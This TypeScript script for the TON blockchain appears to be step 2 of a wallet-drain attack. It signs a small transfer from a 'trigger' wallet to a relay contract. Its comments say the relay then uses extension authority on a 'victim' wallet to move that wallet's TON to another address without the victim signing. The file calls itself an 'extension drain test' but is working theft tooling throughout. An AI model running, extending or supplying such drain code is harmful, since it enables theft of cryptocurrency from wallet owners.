import { Address, beginCell, internal, SendMode, toNano } from "@ton/core";
import { TonClient } from "@ton/ton";
import { loadConfig } from "./utils.js";
import { tonClientOptions } from "./env.js";
import { resolveTriggerMnemonic } from "./payer.js";
import { openW5FromMnemonic } from "./open-w5.js";
import { formatTonSendError } from "./ton-errors.js";

/**
 * Step 2: pay relay → relay uses extension auth on victim → TON to B.
 * Victim does NOT sign.
 */
async function main() {
  const cfg = loadConfig();
  const relay = Address.parse(cfg.relayAddress);

  const triggerMn = resolveTriggerMnemonic();

  const client = new TonClient(tonClientOptions());
  const { key, wallet, opened } = await openW5FromMnemonic(client, triggerMn);

  await new Promise((r) => setTimeout(r, 1500));
  const seqno = await opened.getSeqno();
  console.log("Triggering relay (extension drain test)...");
  console.log("Payer:", wallet.address.toString(), "seqno:", seqno);
  console.log("Relay:", relay.toString());
  console.log("Funds leave:", cfg.walletA, "→", cfg.walletB);

  await new Promise((r) => setTimeout(r, 1500));
  try {
    await opened.sendTransfer({
      seqno,
      secretKey: key.secretKey,
      timeout: Math.floor(Date.now() / 1000) + 600,
      messages: [
        internal({
          to: relay,
          value: toNano("0.08"),
          bounce: true,
          body: beginCell().storeUint(1, 32).endCell(),
        }),
      ],
      sendMode: SendMode.PAY_GAS_SEPARATELY | SendMode.IGNORE_ERRORS,
    });
  } catch (e) {
    console.error(formatTonSendError(e));
    process.exit(1);
  }

  console.log("Sent. Wait ~30s and check balance on", cfg.walletB);
}

main().catch((e) => {
  console.error(formatTonSendError(e));
  process.exit(1);
});
